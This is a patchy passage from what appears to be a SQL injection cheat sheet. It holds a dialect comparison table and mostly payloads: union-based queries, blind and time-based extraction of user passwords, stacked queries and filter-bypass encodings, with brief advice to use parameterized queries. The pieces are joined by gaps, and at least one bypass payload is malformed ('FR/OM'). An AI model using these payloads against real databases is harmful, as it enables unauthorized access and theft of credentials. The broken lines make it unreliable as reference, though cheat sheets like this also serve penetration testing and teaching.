...
* https://www.asafety.fr/en/mysql-injection-cheat-sheet/
* https://medium.com/@shubhamvarma933/sql-injection-in-select-update-insert-and-delete-966d7bf21742

### DBMS / dialect quick reference

| Feature            | MySQL / MariaDB                 | PostgreSQL                               | SQLite               | MSSQL                         | Oracle               |
| ------------------ | ------------------------------- | ---------------------------------------- | -------------------- | ----------------------------- | -------------------- |
| Version            | `VERSION()` / `@@version`       | `VERSION()`                              | `sqlite_version()`   | `@@VERSION`                   | `v$instance`         |
| Character          | `CHAR(65)`                      | `CHR(65)`                                | `CHAR(65)`           | `CHAR(65)`                    | `CHR(65)`            |
| Substring          | `SUBSTRING(s,1,1)` / `MID()`    | `SUBSTRING(s FROM 1 FOR 1)` / `SUBSTR()` | `SUBSTR(s,1,1)`      | `SUBSTRING(s,1,1)`            | `SUBSTR(s,1,1)`      |
| Conditional        | `IF()` / `CASE`                 | `CASE`                                   | `CASE` / `IF()`*    | `IF()` / `CASE`              | `CASE` / `DECODE`    |
| Sleep / delay      | `SLEEP()`                       | `pg_SLEEP()`                             | no native equivalent | `WAITFOR DELAY`               | `DBMS_LOCK.SLEEP()`* |
| Concatenation      | `CONCAT()` / `CONCAT_WS()`      | `\|\|`                                   | `\|\|`               | `+`                           | `\|\|`               |
| Metadata           | `information_schema`, `mysql.*` | `information_schema`, `pg_catalog`       | `sqlite_master`      | `sys.*`, `INFORMATION_SCHEMA` | `ALL_*`, `USER_*`    |
| Identifier quoting | `` `name` ``                    | `"name"`                                 | `"name"`             | `[name]` / `"name"`           | `"name"`             |

* Version/privilege/configuration dependent.
...
-- Identifier / ORDER BY context
SELECT * FROM users ORDER BY <INPUT>;
```

The SQL grammar surrounding the input determines what can be injected.
...
> Prefer parameterized queries for values. Use strict allowlists for identifiers such as table/column names. Escaping is not a substitute for parameterization.

### In Band (Union / Error based SQLi)
...
UNION SELECT @@version,NULL -- -                 # MySQL / MariaDB / MSSQL*
SELECT SLEEP(10)-- -
...
* `@@version` is supported by both MySQL/MariaDB and MSSQL, but the surrounding syntax/context can distinguish them.
...
' UNION SELECT username FROM table LIMIT 1 OFFSET X-- - # DBMS supporting LIMIT/OFFSET
```
...
# MySQL / PostgreSQL / other information_schema-compatible DBMS
...
# MySQL / SQLite / PostgreSQL variants differ in substring syntax:
admin' AND (SELECT SUBSTR(password,1,1)='a')-- -

# PostgreSQL:
admin' AND (SELECT SUBSTRING(password FROM 1 FOR 1)='a')-- -
...
```sql
# MySQL / MariaDB
1; SELECT SLEEP(10) FROM information_schema.tables WHERE table_name='users'-- -

1; SELECT SLEEP(10) FROM users WHERE id=1 AND SUBSTRING(password,1,1)='a'-- -

# MySQL / MariaDB conditional-expression form
?id=IF(SUBSTRING(password,1,1)='a',SLEEP(10),0)-- -

1 AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a',SLEEP(10),0)-- -

# PostgreSQL: pg_SLEEP() + conditional row selection
1; SELECT pg_SLEEP(10) FROM users WHERE id=1 AND SUBSTRING(password,1,1)='a'-- -

# MSSQL: WAITFOR DELAY
# Oracle: DBMS_LOCK.SLEEP(...) is privilege-dependent
```

```sql
## Heavy query

# DBMS/context dependent; this example is primarily MySQL-oriented
...
> Time-based SQLi is highly DBMS-specific. `SLEEP()`, `pg_sleep()`, `WAITFOR`, etc. are not interchangeable, and a delay function must also be placed where the DBMS grammar permits it.
...
> This is a PHP/PDO driver behavior topic, not inherently an out-of-band SQLi technique.

#### RCE / dangerous DBMS capabilities (SQLite, MySQL)
...
> File access, extension loading, and OS command execution are highly DBMS-, configuration-, and privilege-dependent
...
> Filter bypasses are DBMS- and parser-dependent. Treat these as examples of alternate syntax, not universal bypasses.

```sql
# Bypass comma - PostgreSQL-style SUBSTRING syntax
SUBSTRING(password FROM 1 FOR 1)

# Alternate way to construct multiple UNION columns
# DBMS-specific; verify the resulting query grammar
UNION SELECT * FROM (SELECT 1)a
JOIN (SELECT 2)b
JOIN (SELECT 3)c
JOIN (SELECT 4)d

# Bypass equal - MySQL-style hexadecimal string literal
LIKE(0x61)

# Bypass substring - MySQL / MariaDB
MID(password,1,1)

# Bypass quotes
# Numeric comparison; function names are DBMS-dependent
ASCII(MID(password FROM 1 FOR 1))=65

# PostgreSQL-style character construction / concatenation
table_name=CHR(117)||CHR(115)||CHR(101)||CHR(114)||CHR(115)-- -

# Bypass stacked-query filtering
# Hex encoding / decoding semantics are DBMS-dependent
' UNION SELECT 0x73272067726f757020627920322d2d2064-- -

# Bypass spaces - comment-based token separation;
# exact behavior is DBMS-dependent
'/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/OM/**/Users/**/WHE/**/RE/**/username/**/LIKE/**/'xyz'-- -

# Alternate whitespace / encoding
